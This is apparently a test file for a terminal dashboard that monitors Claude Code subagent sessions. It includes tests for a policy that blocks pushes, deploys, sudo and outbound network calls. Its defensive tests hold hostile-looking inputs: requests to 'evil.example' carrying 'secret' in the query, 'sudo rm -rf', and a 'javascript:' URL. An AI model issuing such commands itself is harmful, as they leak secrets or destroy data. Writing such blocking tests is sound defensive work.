import { describe, expect, test } from "bun:test";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { demoUntil } from "../src/demo";
import { map, modelFromTranscript } from "../src/hook";
import { clip, Screen, width } from "../src/screen";
import { apply, initial, type Stamped } from "../src/state";
import { draw, H, modelName, W } from "../src/view";

const fold = (events: Stamped[]) => events.reduce(apply, initial());

// Shapes copied from a real Claude Code 2.1.318 session with three Explore subagents.
const base = { session_id: "s1", transcript_path: "/nonexistent", prompt_id: "p1" };
const payloads = [
  { ...base, hook_event_name: "SessionStart", source: "startup" },
  { ...base, hook_event_name: "UserPromptSubmit", prompt: "read the files" },
  { ...base, hook_event_name: "PreToolUse", effort: { level: "medium" }, tool_name: "Agent",
    tool_input: { description: "Read a.txt", subagent_type: "Explore", model: "haiku", prompt: "…" } },
  { ...base, hook_event_name: "SubagentStart", agent_id: "a1", agent_type: "Explore" },
  { ...base, hook_event_name: "PreToolUse", agent_id: "a1", agent_type: "Explore", tool_name: "Read",
    tool_input: { file_path: "/tmp/x/a.txt" } },
  { ...base, hook_event_name: "SubagentStop", agent_id: "a1", agent_type: "Explore", agent_transcript_path: "/nonexistent" },
  { ...base, hook_event_name: "UserPromptSubmit",
    prompt: "<task-notification>\n<task-id>a1</task-id>\n<status>completed</status>\n</task-notification>" },
  { ...base, hook_event_name: "Stop" },
];

describe("hook mapping", () => {
  const s = fold(payloads.flatMap((p, i) => map(p, 1000 + i * 100)));

  test("pairs the Agent request with SubagentStart", () => {
    expect(s.agents).toHaveLength(1);
    expect(s.agents[0]).toMatchObject({ id: "a1", name: "Explore", model: "haiku", desc: "Read a.txt", tools: 1, status: "done" });
  });

  test("counts lead tools, effort and phase", () => {
    expect(s.lead.tools).toBe(1);
    expect(s.lead.effort).toBe("medium");
    expect(s.phase).toBe("done");
  });

  test("a background result does not replace the user's prompt", () => {
    expect(s.prompt).toBe("read the files");
    expect(s.log.some((l) => l.text === "subagent result back · completed")).toBe(true);
  });

  test("failed tool results count as errors", () => {
    const e = map({ ...base, hook_event_name: "PostToolUse", tool_name: "Bash", tool_response: { is_error: true } });
    expect(fold(e).errors).toBe(1);
  });

  test("reads the latest model from a transcript tail", () => {
    const dir = mkdtempSync(join(tmpdir(), "deck-"));
    const f = join(dir, "t.jsonl");
    writeFileSync(f, '{"message":{"model":"claude-sonnet-5-5"}}\n{"message":{"model":"claude-haiku-5-5"}}\n');
    expect(modelFromTranscript(f)).toBe("claude-haiku-5-5");
    expect(modelFromTranscript("/nonexistent")).toBeUndefined();
  });
});

describe("state", () => {
  test("a new session id clears the board", () => {
    const s = fold([
      { type: "session", sid: "a" },
      { type: "agent.start", id: "x", name: "search" },
      { type: "session", sid: "b" },
    ]);
    expect(s.agents).toHaveLength(0);
    expect(s.sid).toBe("b");
  });

  test("decisions keep the latest answer per question, five at most", () => {
    const s = fold(["a", "b", "a", "c", "d", "e", "f"].map((q, i) => ({ type: "decision", q, p: i / 10, answer: "x" }) as Stamped));
    expect(s.forks).toBe(7);
    expect(s.decisions.map((d) => d.q)).toEqual(["a", "c", "d", "e", "f"]);
  });
});

describe("rendering", () => {
  test("Thai combining marks take no columns", () => {
    expect(width("ที่จอด")).toBe(4);
    const scr = new Screen(10, 1);
    scr.put(0, 0, "ล้างรถ|");
    expect(scr.plain()).toBe("ล้างรถ|");
    expect(width(clip("รายการล่าสุดของวันนี้", 6))).toBe(6);
  });

  test("model ids read as names", () => {
    expect(modelName("claude-sonnet-5-5")).toBe("Sonnet 5.5");
    expect(modelName("claude-haiku-4-5-20251001")).toBe("Haiku 4.5");
    expect(modelName("opus")).toBe("Opus");
  });

  test("every demo moment renders inside the frame", () => {
    for (let ms = 0; ms <= 30000; ms += 250) {
      const s = fold(demoUntil(ms));
      const rows = draw(s, ms / 120, s.updatedAt).plain().split("\n");
      expect(rows).toHaveLength(H);
      for (const r of rows) expect(width(r)).toBeLessThanOrEqual(W);
    }
  });

  test("an empty board renders", () => {
    expect(draw(initial(), 0).plain()).toContain("V-SWARM");
  });
});

import { digest, parseAdvice } from "../src/advisor";
import { signature } from "../src/brain";

describe("advisor and jev glue", () => {
  test("the same error matches across changing numbers and paths", () => {
    const a = signature("Bash", "Exit code 1\nls: /tmp/run-123/x: No such file or directory");
    const b = signature("Bash", "Exit code 2\nls: /tmp/run-456/y: No such file or directory");
    expect(a).toBe(b);
    expect(signature("Read", "ls: /a: No such file")).not.toBe(a);
  });

  test("advice JSON is read even inside fences or prose", () => {
    const r = parseAdvice('Sure:\n```json\n{"ok": false, "headline": "missing B- label", "advice": ["label B-", "add hub IN"]}\n```');
    expect(r).toEqual({ ok: false, headline: "missing B- label", advice: ["label B-", "add hub IN"] });
    expect(parseAdvice("not json at all").ok).toBe(true);
  });

  test("digest keeps text, tool calls and results", () => {
    const dir = mkdtempSync(join(tmpdir(), "deck-"));
    const f = join(dir, "t.jsonl");
    writeFileSync(f, [
      JSON.stringify({ type: "user", message: { content: "build the diagram" } }),
      JSON.stringify({ type: "assistant", message: { content: [{ type: "tool_use", name: "Write", input: { file_path: "index.html" } }] } }),
      JSON.stringify({ type: "user", message: { content: [{ type: "tool_result", is_error: true, content: "denied" }] } }),
      "not json",
    ].join("\n"));
    const d = digest(f);
    expect(d).toContain("USER: build the diagram");
    expect(d).toContain("[tool Write]");
    expect(d).toContain("[result ERROR] denied");
  });
});

import { parseKeys, dropLast } from "../src/tui";
import { questionOptions } from "../src/view";
import { wrap } from "../src/screen";
import { hasHooks, setHooks } from "../src/hooks";
import { readFileSync } from "node:fs";

describe("chat and input", () => {
  test("numbered choices at the end of a question become options", () => {
    const t = "Done.\n\nWhere should counters live?\n1) In memory — simple\n2. **Redis**\n3) Postgres";
    expect(questionOptions(t)).toEqual(["In memory", "Redis", "Postgres"]);
    expect(questionOptions("Pick?\n1) Redis (shared)\n2) Memory")).toEqual(["Redis", "Memory"]);
    expect(questionOptions("No list here?")).toEqual([]);
  });

  test("keys: enter, arrows, paste and Thai text", () => {
    expect(parseKeys("\r")).toEqual([{ name: "enter" }]);
    expect(parseKeys("\x1b[A")).toEqual([{ name: "up" }]);
    expect(parseKeys("line one\nline two")).toEqual([{ name: "text", text: "line one line two" }]);
    expect(parseKeys("ที่ไหน")).toEqual([{ name: "text", text: "ที่ไหน" }]);
  });

  test("backspace removes a whole Thai character cluster", () => {
    expect(dropLast("ที่")).toBe("");
    expect(dropLast("abc")).toBe("ab");
  });

  test("wrap keeps Thai words whole and respects width", () => {
    const lines = wrap("ระบบจะส่งงานให้ subagent ทั้งสามตัวพร้อมกันแล้วรวมผลกลับมา", 20);
    for (const l of lines) expect(width(l)).toBeLessThanOrEqual(20);
    expect(lines.join("").replace(/\s/g, "")).toBe("ระบบจะส่งงานให้subagentทั้งสามตัวพร้อมกันแล้วรวมผลกลับมา");
  });

  test("the board fits any terminal size from the minimum up", () => {
    const s = fold(demoUntil(20000));
    for (const [w, h] of [[120, 36], [150, 44], [200, 70]]) {
      const rows = draw(s, 3, s.updatedAt, { w, h, ui: { mode: "run", input: "ใช่ ไป Redis", options: ["a", "b"] } }).plain().split("\n");
      expect(rows.length).toBe(Math.min(Math.max(h, 36), 60));
      for (const r of rows) expect(width(r)).toBeLessThanOrEqual(Math.min(Math.max(w, 120), 180));
    }
  });
});

describe("hooks file", () => {
  test("on and off leave other hooks alone", () => {
    const dir = mkdtempSync(join(tmpdir(), "vs-"));
    const f = join(dir, "settings.json");
    writeFileSync(f, JSON.stringify({ model: "x", hooks: { Stop: [{ hooks: [{ type: "command", command: "say done" }] }] } }));
    setHooks(f, true);
    expect(hasHooks(f)).toBe(true);
    setHooks(f, true);
    const once = JSON.parse(readFileSync(f, "utf8"));
    expect(once.hooks.Stop).toHaveLength(2);
    setHooks(f, false);
    expect(JSON.parse(readFileSync(f, "utf8"))).toEqual({ model: "x", hooks: { Stop: [{ hooks: [{ type: "command", command: "say done" }] }] } });
  });
});

import { nameOf, profileDir } from "../src/claude";
import { homedir } from "node:os";

describe("claude accounts", () => {
  test("profile names map to Claude Code config folders", () => {
    expect(profileDir("work")).toBe(join(homedir(), ".claude-work"));
    expect(profileDir("default")).toBe(join(homedir(), ".claude"));
    expect(profileDir("~/x/claude")).toBe(join(homedir(), "x/claude"));
    expect(nameOf(join(homedir(), ".claude-personal"))).toBe("personal");
    expect(nameOf(join(homedir(), ".claude"))).toBe("default");
  });
});

/** A tiny terminal: follows cursor moves, and advances `markWidth` columns for a combining mark, as some terminals do. */
function emulate(ansi: string, w: number, h: number, markWidth: number): string[][] {
  const grid = Array.from({ length: h }, () => Array(w).fill(" "));
  let r = 0, c = 0;
  const re = /\x1b\[([\d;?]*)([A-Za-z])|([\s\S])/gu;
  for (const m of ansi.matchAll(re)) {
    const p = (m[1] ?? "").split(";");
    if (m[2] === "H") { r = Number(p[0] || 1) - 1; c = Number(p[1] || 1) - 1; continue; }
    if (m[2] === "G") { c = Number(p[0] || 1) - 1; continue; }
    if (m[2] || !m[3]) continue;
    const ch = m[3];
    if (ch === "\n") { r++; c = 0; continue; }
    const cw = /\p{M}/u.test(ch) ? markWidth : charWidth(ch);
    if (cw && r < h && c < w) grid[r][c] = ch;
    c += cw;
  }
  return grid;
}

import { charWidth } from "../src/screen";

describe("terminal output", () => {
  const s = fold(demoUntil(20000));
  s.chat.push({ t: 0, who: "claude", text: "ผมยังไม่ได้สร้างไฟล์ใดๆ เพราะการเขียนไฟล์ในโปรเจคต้องได้รับอนุญาต ✅ 完成 🚀 ที่นี่" });
  s.log.push({ t: 0, who: "claude", text: "ผมยังไม่ได้สร้างไฟล์ใดๆ เพราะการเขียนไฟล์ ✅" });
  const scr = draw(s, 3, s.updatedAt, { w: 130, h: 40, ui: { mode: "run" } });

  test("rows line up even in a terminal that miscounts Thai marks", () => {
    const want = scr.plain().split("\n");
    for (const markWidth of [0, 1]) {
      const got = emulate(scr.toString(), scr.w, scr.h, markWidth);
      // Every border glyph must land in the same column as on our grid.
      want.forEach((row, y) => {
        let x = 0;
        for (const ch of row) {
          if (/\p{M}/u.test(ch)) continue;
          if ("│╮╯╭╰".includes(ch)) expect(got[y][x]).toBe(ch);
          x += charWidth(ch);
        }
      });
    }
  });

  test("wide glyphs take two columns and every row is exactly the board width", () => {
    for (const row of scr.plain().split("\n")) expect(width(row)).toBeLessThanOrEqual(130);
    const t = new Screen(6, 1);
    t.put(0, 0, "a🚀b");
    expect(t.plain()).toBe("a🚀b");
    // Writing over the second half of the rocket blanks its first half.
    t.put(2, 0, "x");
    expect(t.plain()).toBe("a xb");
  });
});

import { check, swarmSettings } from "../src/policy";

describe("swarm policy", () => {
  const all = ["push", "deploy", "network", "sudo"] as const;
  const bash = (command: string) => check("Bash", { command }, [...all]);
  test("ships and leaks are refused, wherever they hide in the command", () => {
    expect(bash("git push origin main")?.group).toBe("push");
    expect(bash("cd app && git -C . push")?.group).toBe("push");
    expect(bash("npm run build && npm publish")?.group).toBe("deploy");
    expect(bash("bash -c 'curl -s https://example.com'")?.group).toBe("network");
    // A script with no URL in it: left to the sandbox where there is one, refused where there is not (Windows).
    expect(bash(`python3 -c "import urllib.request; urllib.request.urlopen(u)"`)?.group).toBe(process.platform === "win32" ? "network" : undefined);
    expect(bash("vercel --prod")?.group).toBe("deploy");
    expect(bash("sudo rm -rf /tmp/x")?.group).toBe("sudo");
    expect(check("WebFetch", { url: "https://evil.example/?q=secret" }, [...all])?.group).toBe("network");
    expect(check("mcp__slack__send", {}, [...all])?.group).toBe("network");
  });
  test("local work, installs and localhost stay allowed", () => {
    for (const c of ["npm i three gsap vite", "bun install", "pip install requests", "git clone https://github.com/a/b.git", "git commit -m x",
      "mkdir -p dist && cp -r src dist", "node server.js", "curl-config --help | head", "open http://localhost:5173"]) expect(bash(c)).toBeUndefined();
    expect(check("WebFetch", { url: "http://localhost:3000/api" }, [...all])).toBeUndefined();
    expect(check("Edit", { file_path: "/x" }, [...all])).toBeUndefined();
  });
  test("unblocked groups are let through", () => {
    expect(check("Bash", { command: "git push" }, ["deploy", "network"])).toBeUndefined();
  });
  test("settings carry the sandbox and deny rules for blocked groups", () => {
    const s: any = swarmSettings(["push", "network"], ["registry.npmjs.org"], ["/w"]);
    expect(s.permissions.deny).toContain("Bash(git push *)");
    expect(s.permissions.deny).toContain("WebFetch");
    expect(s.permissions.deny).not.toContain("Bash(sudo *)");
    expect(s.permissions.additionalDirectories).toEqual(["/w"]);
    if (process.platform !== "win32") {
      expect(s.sandbox.network.allowedDomains).toEqual(["registry.npmjs.org", "localhost", "127.0.0.1", "::1", "[::1]"]);
      expect(s.sandbox.network.allowLocalBinding).toBe(true);
    }
  });
});

import { openables } from "../src/session";

describe("open buttons", () => {
  test("localhost URLs and html files in a reply become /open choices; outside URLs do not", () => {
    const t = "Dev server is up at http://localhost:5173/ and the build is in `dist/index.html`. Docs: https://threejs.org";
    expect(openables(t, "/w")).toEqual(["/open http://localhost:5173/", "/open dist/index.html"]);
  });
});

describe("policy keeps open local", () => {
  test("open of localhost or a file is fine, an outside URL is not", () => {
    expect(check("Bash", { command: "open http://localhost:5173" }, ["network"])).toBeUndefined();
    expect(check("Bash", { command: "open dist/index.html" }, ["network"])).toBeUndefined();
    expect(check("Bash", { command: "open https://evil.example/?d=secret" }, ["network"])?.group).toBe("network");
  });
});

describe("localhost is not traffic out", () => {
  test("curl and scripts against localhost pass, outside hosts do not", () => {
    const n = (command: string) => check("Bash", { command }, ["network"]);
    expect(n("curl -s http://localhost:5173/")).toBeUndefined();
    expect(n(`python3 -c "import urllib.request;urllib.request.urlopen('http://localhost:5277/')"`)).toBeUndefined();
    expect(n("curl -s http://localhost:5173/ && curl https://example.com")?.group).toBe("network");
    expect(n(`python3 -c "import urllib.request;urllib.request.urlopen('https://example.com')"`)?.group).toBe("network");
    expect(n("ssh localhost")?.group).toBe("network");
  });
});

import { plain } from "../src/view";

describe("chat markdown", () => {
  test("code fences become indented lines, inline code loses its backticks", () => {
    const t = "Run this:\n```bash\n!curl -s http://localhost:5281/\n```\nไม่ได้รัน `open` ตามที่ขอ";
    expect(plain(t)).toBe("Run this:\n    !curl -s http://localhost:5281/\nไม่ได้รัน open ตามที่ขอ");
  });
});

describe("resume", () => {
  test("subagents of a finished process do not count as running after a restart", () => {
    const s = fold([
      // `claude --resume` keeps the session id, so the board is not reset by it.
      { type: "session", sid: "x", start: true, t: 0 } as Stamped,
      { type: "agent.start", id: "a", name: "parts", t: 1 } as Stamped,
      { type: "session", sid: "x", start: true, t: 2 } as Stamped,
    ]);
    expect(s.agents[0].status).toBe("failed");
  });
});

describe("background swarm", () => {
  test("the lead stopping while subagents run is still the swarm phase", () => {
    const s = fold([
      { type: "agent.request", name: "general-purpose", desc: "parts.js model", t: 0 } as Stamped,
      { type: "agent.start", id: "a", name: "general-purpose", t: 1 } as Stamped,
      { type: "phase", phase: "done", t: 2 } as Stamped,
    ]);
    expect(s.phase).toBe("delegating");
    expect(draw(s, 0, 3).plain()).toContain("parts.js");
  });
});

import { localTarget } from "../src/shot";

describe("vswarm shot", () => {
  test("only local pages can be opened", () => {
    expect(localTarget("http://localhost:5290/?t=0.5", "/")).toBe("http://localhost:5290/?t=0.5");
    expect(localTarget("http://0.0.0.0:3000", "/")).toBe("http://localhost:3000");
    expect(localTarget("https://example.com", "/")).toBeUndefined();
    expect(localTarget("javascript:alert(1)", "/")).toBeUndefined();
    expect(localTarget("package.json", join(import.meta.dir, ".."))).toStartWith("file://");
    expect(localTarget("missing.html", "/")).toBeUndefined();
  });
  test("swarm settings let only the shot command leave the sandbox", () => {
    const s: any = swarmSettings(["network"], [], [], "/home/u/.vswarm/bin/vswarm");
    if (process.platform !== "win32") expect(s.sandbox.excludedCommands).toEqual(["/home/u/.vswarm/bin/vswarm shot *", "vswarm shot *"]);
  });
});
